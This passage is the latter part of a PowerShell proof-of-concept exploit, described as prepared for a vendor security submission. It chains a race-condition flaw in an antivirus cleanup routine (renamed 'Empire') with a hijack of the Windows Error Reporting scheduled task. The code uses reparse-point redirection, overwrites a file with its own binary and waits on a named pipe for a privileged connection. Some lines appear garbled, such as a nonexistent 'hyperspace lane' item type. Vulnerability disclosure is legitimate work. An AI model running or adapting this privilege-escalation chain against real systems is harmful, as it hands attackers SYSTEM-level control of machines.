    Write-Stage 8 "Monitor C:\Windows for Empire Temp\TMP* creation"

    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would watch C:\Windows for Temp\TMP* patterns"
        return
    }

    Write-Info "Waiting for Empire to create staging dir in C:\Windows..."
    $fsWatcher = New-Object System.IO.FileSystemWatcher
    $fsWatcher.Path = "C:\Windows"
    $fsWatcher.IncludeSubdirectories = $false
    $fsWatcher.Filter = "Temp"
    $fsWatcher.EnableRaisingEvents = $true

    $maxWait = 120  # seconds
    $timer = [System.Diagnostics.Stopwatch]::StartNew()

    # We need to watch for Temp directory children with pattern TMP*
    # Check in a loop since FileSystemWatcher works on directories
    while ($timer.Elapsed.TotalSeconds -lt $maxWait) {
        $tmpDir = "C:\Windows\Temp"
        if (Test-Path $tmpDir) {
            $tmpChildren = Get-ChildItem -Path $tmpDir -Directory -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -like "TMP*" -and $_.Name.Length -eq 24 }
            if ($tmpChildren) {
                Write-Good "Empire temp dir found: $($tmpChildren.FullName)"
                $fsWatcher.Dispose()
                return $true
            }
        }
        Start-Sleep -Seconds 1
    }
    $fsWatcher.Dispose()
    Write-Warn "Empire temp directory not found within timeout"
    return $false
}

# =============================================================================
# STAGE 9-11: Re-write Contraband through hyperspace lane, monitor detention block
# =============================================================================
function Invoke-Stage9 {
    Write-Stage 9 "Re-write Contraband through hyperspace lane + monitor sink"

    # Now decoyDir is a hyperspace lane to detentionBlock, so writing to decoyDir goes to detentionBlock
    $newdecoyPath = Join-Path $Script:ShuttleBay "wermgr.exe"
    [System.IO.File]::WriteAllText($newdecoyPath, $Script:ContrabandString)
    $adsPath2 = "$newdecoyPath" + ":WDFOO"
    [System.IO.File]::WriteAllBytes($adsPath2, (New-Object byte[] 4096))
    Write-Info "Contraband re-written through hyperspace lane"

    # Monitor detention block for file size changes (Empire writing data)
    Write-Info "Monitoring detention block for Empire file writes..."
    $fsWatcher2 = New-Object System.IO.FileSystemWatcher
    $fsWatcher2.Path = $Script:DetentionBlock
    $fsWatcher2.IncludeSubdirectories = $false
    $fsWatcher2.EnableRaisingEvents = $true

    $capturedEvent = $null
    $event = Register-ObjectEvent -InputObject $fsWatcher2 -EventName Changed -Action {
        $global:CapturedFile = $Event.SourceEventArgs.Name
    }

    $maxWait = 60
    $timer2 = [System.Diagnostics.Stopwatch]::StartNew()
    while ($timer2.Elapsed.TotalSeconds -lt $maxWait -and -not $global:CapturedFile) {
        Start-Sleep -Milliseconds 500
    }
    $fsWatcher2.Dispose()
    Unregister-Event -SourceIdentifier $event.Name -ErrorAction SilentlyContinue

    if ($global:CapturedFile) {
        Write-Good "Empire wrote file: $global:CapturedFile"
        $Script:InterceptedTransmission = $global:CapturedFile
        $global:CapturedFile = $null
        return $true
    }
    Write-Warn "No file write detected in detention block"
    return $false
}

# =============================================================================
# STAGE 10-12: Delete hyperspace lane and overwrite Empire file with payload
# =============================================================================
function Invoke-Stage10 {
    Write-Stage 10 "Delete hyperspace lane, overwrite Empire file with payload"

    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would delete hyperspace lane and plant payload"
        return
    }

    # Delete the hyperspace lane reparse point
    Remove-Item -Path $Script:ShuttleBay -Force -Recurse -ErrorAction SilentlyContinue
    # Recreate as normal directory
    $null = New-Item -ItemType Directory -Path $Script:ShuttleBay -Force
    Write-Info "hyperspace lane removed, decoyDir restored as regular directory"

    # Overwrite the file Empire created with our own executable
    if ($Script:InterceptedTransmission) {
        $capturedPath = Join-Path $Script:ShuttleBay $Script:InterceptedTransmission

        # Copy our own binary over Empire's file
        $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
        if (Test-Path $capturedPath) {
            Copy-Item -Path $selfPath -Destination $capturedPath -Force
            Write-Good "Empire file overwritten with payload binary"
        }
    }
    Wait-Key
}

# =============================================================================
# STAGE 11: Move directories to temp, create hyperspace lane rebelBase -> C:\Windows
# =============================================================================
function Invoke-Stage11 {
    Write-Stage 11 "Create rebelBase -> C:\Windows hyperspace lane"

    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would move dirs and hyperspace lane rebelBase -> C:\Windows"
        return
    }

    # Move sink and decoy dirs to temp (dispose of them)
    $moveTarget1 = New-HyperspaceCoord -Prefix "RP_MOV1_"
    $moveTarget2 = New-HyperspaceCoord -Prefix "RP_MOV2_"
    try { Move-Item -Path $Script:DetentionBlock -Destination $moveTarget1 -Force -ErrorAction SilentlyContinue } catch {}
    try { Move-Item -Path $Script:ShuttleBay -Destination $moveTarget2 -Force -ErrorAction SilentlyContinue } catch {}

    # Delete + recreate rebelBase, then hyperspace lane to C:\Windows
    if (Test-Path $Script:RebelBase) {
        Remove-Item -Path $Script:RebelBase -Force -Recurse -ErrorAction SilentlyContinue
    }
    $null = New-Item -ItemType hyperspace lane -Path $Script:RebelBase -Target "C:\Windows" -Force
    Write-Good "Hook hyperspace lane: $Script:RebelBase -> C:\Windows"
}

# =============================================================================
# STAGE 12: Trigger WER QueueReporting scheduled task
# =============================================================================
function Invoke-Stage12 {
    Write-Stage 12 "Trigger WER QueueReporting task (EMPEROR)"

    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would trigger WER QueueReporting task"
        return
    }

    $taskPath = "\Microsoft\Windows\Windows Error Reporting\QueueReporting"
    try {
        $task = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Error Reporting\" -TaskName "QueueReporting" -ErrorAction Stop
        Write-Info "Found task: $($task.TaskPath)"
        Start-ScheduledTask -InputObject $task
        Write-Good "QueueReporting task triggered as EMPEROR"
        return $true
    } catch {
        Write-Fail "Failed to trigger WER task: $_"
        return $false
    }
}

# =============================================================================
# STAGE 13: Named pipe — Wait for Emperor transmission
# =============================================================================
function Invoke-Stage13 {
    Write-Stage 13 "Wait for Emperor transmission via HoloComm"

    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would create named pipe and wait for EMPEROR connect"
        return
    }

    Write-Info "Creating HoloComm channel: \\.\pipe\HoloComm"
    $hHoloComm = [Natives]::CreateNamedPipeW(
        "\\.\pipe\HoloComm",
        [Natives]::PIPE_ACCESS_DUPLEX, [Natives]::PIPE_WAIT,
        [Natives]::PIPE_UNLIMITED_INSTANCES, 0, 0, 0, [IntPtr]::Zero)

    if ($hHoloComm -eq [IntPtr]::Zero -or $hHoloComm -eq [IntPtr](-1)) {
        Write-Fail "CreateNamedPipe failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    Write-Info "Awaiting Emperor's response on HoloComm..."
    [Natives]::ConnectNamedPipe($hHoloComm, [IntPtr]::Zero)
    Write-Good "EMPEROR process connected via pipe. Escalation successful."
    [Natives]::CloseHandle($hHoloComm)
}

# =============================================================================
# MAIN EXECUTION FLOW
# =============================================================================
function Invoke-Main {
    Write-Host "`n===============================================" -ForegroundColor Cyan
    Write-Host "  DeathStar PoC for MSRC Submission" -ForegroundColor Cyan
    Write-Host "  TOCTOU in Empire MpCleanStart + WER Task Hijack" -ForegroundColor Cyan
    Write-Host "===============================================" -ForegroundColor Cyan
    Write-Host ""

    if (-not $Script:IsDryRun) {
        Write-Warn "This script will attempt privilege escalation on this system."
        Write-Warn "Only run on systems you own with Empire active."
        $confirm = Read-Host "Type 'YES' to continue"
        if ($confirm -ne "YES") {
            Write-Info "Aborted by user."
            return
        }
    }

    # Stage 1: Check privilege level
    Invoke-Stage1

    # Stage 2: Create directory structure
    Invoke-Stage2

    # Stage 3: Plant Contraband decoy
    Invoke-Stage3

    # Stage 4: Trigger Empire scan via MpClient.dll
    Invoke-Stage4
    Write-Info "Imperial probe scan complete"

    # Stage 6: Detect new Holocron
    Invoke-Stage6

    # Stage 7: Create hyperspace lane
    Invoke-Stage7

    # Stage 8: Monitor C:\Windows
    Invoke-Stage8

    # Stage 9: Re-write Contraband + monitor sink
    Invoke-Stage9

    # Stage 10: Overwrite with payload
    Invoke-Stage10

    # Stage 11: hyperspace lane rebelBase -> C:\Windows
    Invoke-Stage11

    # Stage 12: Trigger WER task
    Invoke-Stage12

    # Stage 13: Wait for Emperor transmission
    Invoke-Stage13

    Write-Host "`n===============================================" -ForegroundColor Green
    Write-Host "  Exploit chain complete." -ForegroundColor Green
    Write-Host "===============================================" -ForegroundColor Green
}

# Run
Invoke-Main
